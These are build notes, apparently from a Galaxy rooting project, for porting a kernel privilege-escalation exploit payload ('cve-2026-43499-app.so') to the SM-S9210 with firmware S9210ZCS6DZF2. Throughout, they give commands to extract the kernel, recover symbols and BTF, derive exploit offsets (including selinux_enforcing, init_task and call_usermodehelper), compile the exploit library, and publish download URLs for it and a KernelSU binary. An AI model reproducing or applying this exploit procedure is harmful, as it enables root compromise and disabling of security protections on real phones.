# SM-S9210 / S9210ZCS6DZF2 payload build notes

This note records the exact steps used to produce the `e1q-S9210ZCS6DZF2`
app payload from the supplied firmware package.

## Inputs

```text
profileId: e1q-S9210ZCS6DZF2
model: SM-S9210
firmwareVersion: S9210ZCS6DZF2
firmware directory: /Users/jiyuren/Downloads/SAMFW.COM_SM-S9210_CHC_S9210ZCS6DZF2_fac
AP directory: /Users/jiyuren/Downloads/SAMFW.COM_SM-S9210_CHC_S9210ZCS6DZF2_fac/AP_S9210ZCS6DZF2_S9210ZCS6DZF2_MQB110793834_REV00_user_low_ship_MULTI_CERT_meta_OS16
boot image: boot.img
```

Extracted kernel identity:

```text
kernel release: 6.1.145-android14-11-3254743-abS9210ZCS6DZF2
raw Image size: 38005248
raw Image SHA-256: 578D84F36CAE47756CE39893105C71F2FF7A8EFE3FE478D0CEC4127E6059E9F1
ELF base: 0xffffffc008000000
```

## One-command rebuild after the target profile exists

From the repository root:

```sh
./tools/build_payload_release.sh e1q-S9210ZCS6DZF2 /Users/jiyuren/Library/Android/sdk/ndk/27.1.12297006
```

The script auto-handles macOS/Linux NDK host tags, fixed-size padding, artifact
copying, and SHA-256 reporting.

Expected artifact:

```text
artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so
size: 104128
SHA-256: 35eca57aee9b5f10167ba19b69344495829071074ac86d18e57105d16589b4ef
```

## Full procedure used for this port

### 1. Extract the raw kernel Image

```sh
mkdir -p /private/tmp/e1q-S9210ZCS6DZF2
python3 - <<'PY'
from pathlib import Path
import hashlib, struct
boot = Path('/Users/jiyuren/Downloads/SAMFW.COM_SM-S9210_CHC_S9210ZCS6DZF2_fac/AP_S9210ZCS6DZF2_S9210ZCS6DZF2_MQB110793834_REV00_user_low_ship_MULTI_CERT_meta_OS16/boot.img')
out = Path('/private/tmp/e1q-S9210ZCS6DZF2/kernel')
b = boot.read_bytes()
kernel_size = struct.unpack_from('<I', b, 8)[0]
k = b[0x1000:0x1000 + kernel_size]
out.write_bytes(k)
print('kernel size:', len(k))
print('kernel sha256:', hashlib.sha256(k).hexdigest().upper())
PY
strings -a /private/tmp/e1q-S9210ZCS6DZF2/kernel | grep -m 1 'Linux version'
```

### 2. Recover the symbolized ELF and symbol table

```sh
vmlinux-to-elf \
  /private/tmp/e1q-S9210ZCS6DZF2/kernel \
  /private/tmp/e1q-S9210ZCS6DZF2/vmlinux.elf

/opt/homebrew/opt/llvm/bin/llvm-nm --numeric-sort \
  /private/tmp/e1q-S9210ZCS6DZF2/vmlinux.elf \
  > /private/tmp/e1q-S9210ZCS6DZF2/vmlinux.nm
```

### 3. Extract BTF

```sh
python3 - <<'PY'
from pathlib import Path
import struct
image = Path('/private/tmp/e1q-S9210ZCS6DZF2/kernel').read_bytes()
prefix = b'\x9f\xeb\x01\x00'
candidates = []
cursor = 0
while True:
    start = image.find(prefix, cursor)
    if start < 0:
        break
    cursor = start + 1
    if start + 24 > len(image):
        continue
    magic, version, flags, hdr_len, type_off, type_len, str_off, str_len = \
        struct.unpack_from('<HBBIIIII', image, start)
    if magic != 0xeb9f or version != 1 or flags != 0 or hdr_len < 24:
        continue
    payload_len = max(type_off + type_len, str_off + str_len)
    end = start + hdr_len + payload_len
    string_start = start + hdr_len + str_off
    if end <= len(image) and string_start < end and image[string_start] == 0:
        candidates.append((start, end))
if len(candidates) != 1:
    raise SystemExit(candidates)
start, end = candidates[0]
Path('/private/tmp/e1q-S9210ZCS6DZF2/vmlinux.btf').write_bytes(image[start:end])
print(hex(start), hex(end), end - start)
PY
```

For this firmware the BTF interval was:

```text
[0x180b384, 0x1dbfdc6), size 5982786
```

### 4. Derive target constants

The following constants were taken from the recovered `vmlinux.nm`, using
`0xffffffc008000000` as the image base:

```text
CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d39cc
NOOP_LLSEEK_OFF                   0x003a14e4
COPY_SPLICE_READ_OFF              0x003ef340
CONFIGFS_READ_ITER_OFF            0x004712a4
CONFIGFS_BIN_WRITE_ITER_OFF       0x004717d4
ASHMEM_IOCTL_OFF                  0x00d3a314
ASHMEM_COMPAT_IOCTL_OFF           0x00d3ac4c
ASHMEM_MMAP_OFF                   0x00d3aca4
ASHMEM_OPEN_OFF                   0x00d3aed0
ASHMEM_RELEASE_OFF                0x00d3af58
ASHMEM_SHOW_FDINFO_OFF            0x00d3b078
ANON_PIPE_BUF_OPS_OFF             0x01219d90
ASHMEM_FOPS_OFF                   0x013d1140
KMALLOC_CACHES_OFF                0x0176cbb8
SYSTEM_UNBOUND_WQ_OFF             0x0223ae60
INIT_TASK_OFF                     0x0224f8c0
ROOT_TASK_GROUP_OFF               0x0244cd80
SELINUX_ENFORCING_OFF             0x02521588
SLIDE_LOGGERS_0_1_OFF             0x02242a20
SLIDE_SYSCTL_BOOTID_OFF           0x026046e8
```

Image searches supplied the remaining slide constants:

```text
nfnetlink_log string offset:          0x016a6574
sysctl_bootid pointer slot offset:    0x023762f0
```

The target uses the same Qualcomm 6.1.145 route settings as
`e3q-S928USQS6DZF2`:

```text
P0_PHYS_OFFSET       0x80000000
P0_KERNEL_PHYS_LOAD  0x80080000
SKB_DATA_DELTA       -0x1000
COMPACT_RT_MUTEX_WAITER 1
SLIDE_TRACEFS_EVENT_ID 106
SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0
SLIDE_PSELECT_WORD_SHIFT 3
```

### 5. Generate the P0 fingerprint table

```sh
perl tools/generate_p0_fingerprint.pl \
  /private/tmp/e1q-S9210ZCS6DZF2/kernel \
  0x1f0000 \
  src/targets/e1q-S9210ZCS6DZF2/p0_fingerprint.h
```

Observed verification output:

```text
verified 32 rows and 256 source qwords at probe 0x1f0000
```

### 6. Create the target profile

Create:

```text
src/targets/e1q-S9210ZCS6DZF2/target.h
src/targets/e1q-S9210ZCS6DZF2/p0_fingerprint.h
```

For this port, `target.h` was based on the existing Qualcomm 6.1.145 target
`src/targets/e3q-S928USQS6DZF2/target.h`, then these values were changed:

```text
BUILD_VARIANT_LABEL -> e1q-S9210ZCS6DZF2-...
BUILD_FINGERPRINT   -> samsung/e1qzcx/qssi_64:16/BP4A.251205.006/S9210ZCS6DZF2:user/release-keys
P0_FINGERPRINT_HEADER -> targets/e1q-S9210ZCS6DZF2/p0_fingerprint.h
KMALLOC_CACHES_OFF  -> 0x0176cbb8
SLIDE_NFULNL_LOGGER_OFF -> 0x016a6574
```

### 7. Build the release `.so`

Use the portable script:

```sh
./tools/build_payload_release.sh e1q-S9210ZCS6DZF2 /Users/jiyuren/Library/Android/sdk/ndk/27.1.12297006
```

Equivalent direct command shape:

```sh
/Users/jiyuren/Library/Android/sdk/ndk/27.1.12297006/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android35-clang \
  -DAPP_PAYLOAD=1 -fPIC -Oz -g0 \
  -fno-unwind-tables -fno-asynchronous-unwind-tables \
  -ffunction-sections -fdata-sections \
  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
  -Isrc -DTARGET_HEADER='"targets/e1q-S9210ZCS6DZF2/target.h"' \
  src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c \
  -shared -pthread -Wl,--gc-sections -Wl,--icf=all -s \
  -o build/e1q-S9210ZCS6DZF2/cve-2026-43499-app.release.so
truncate -s 104128 build/e1q-S9210ZCS6DZF2/cve-2026-43499-app.release.so
cp build/e1q-S9210ZCS6DZF2/cve-2026-43499-app.release.so \
  artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so
```

### 8. Add the support feed entry

Add this object to `support/targets-v3.json`:

```json
{
  "payloadId": "e1q-S9210ZCS6DZF2",
  "displayName": "Galaxy S24 | Kernel 6.1.145",
  "models": ["SM-S9210"],
  "kernelVersions": ["6.1.145"],
  "exploit": {
    "url": "https://raw.githubusercontent.com/BuSung-dev/Root-My-Galaxy-Payloads/main/artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so",
    "size": 104128
  },
  "kernelsu": {
    "url": "https://ds.jamsg.cn/d/Release/JSG-LLC/GalaxyRootKickUP/KSU/ksud-samsung-android14-6.1-kdp",
    "size": 4879856
  }
}
```

### 9. Verify

```sh
python3 -m json.tool support/targets-v3.json >/tmp/targets-v3.verify.json
file artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so
stat -f '%N %z' artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so
shasum -a 256 artifacts/e1q-S9210ZCS6DZF2/cve-2026-43499-app.so
```
